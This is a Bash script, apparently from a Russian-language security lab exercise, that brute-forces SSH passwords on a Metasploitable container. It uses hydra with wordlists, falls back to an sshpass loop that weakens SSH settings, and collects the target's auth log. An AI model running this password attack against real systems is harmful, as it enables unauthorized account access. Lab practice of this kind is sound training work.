#!/usr/bin/env bash
# Задание 2 — подбор пароля SSH (hydra / sshpass для legacy SSH Metasploitable)
set -euo pipefail
TARGET="${1:-172.28.0.10}"
ATTACK="$(cd "$(dirname "$0")/../attack" && pwd)"
LOGS="$(cd "$(dirname "$0")/../logs" && pwd)"
mkdir -p "$LOGS"

echo "Hydra: $ATTACK/users.txt + $ATTACK/pass.txt -> ssh://$TARGET"
if command -v hydra >/dev/null; then
  hydra -L "$ATTACK/users.txt" -P "$ATTACK/pass.txt" -t 4 -f -V "$TARGET" ssh | tee "$LOGS/hydra-task2.log"
else
  echo "(hydra не установлен — перебор через sshpass + legacy OpenSSH)" | tee "$LOGS/hydra-task2.log"
  while read -r u; do
    while read -r p; do
      if sshpass -p "$p" ssh -o ConnectTimeout=3 \
        -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
        -o MACs=hmac-sha1 -o StrictHostKeyChecking=no \
        "$u@$TARGET" exit 2>/dev/null; then
        echo "[FOUND] login: $u password: $p" | tee -a "$LOGS/hydra-task2.log"
        exit 0
      fi
      echo "[TRY] $u / $p" >> "$LOGS/hydra-task2.log"
    done < "$ATTACK/pass.txt"
  done < "$ATTACK/users.txt"
fi

docker exec ms2-target sh -c 'grep -E "Failed|Invalid|Accepted" /var/log/auth.log | tail -30' \
  > "$LOGS/fail2ban/task2-target-auth.log" 2>/dev/null || true
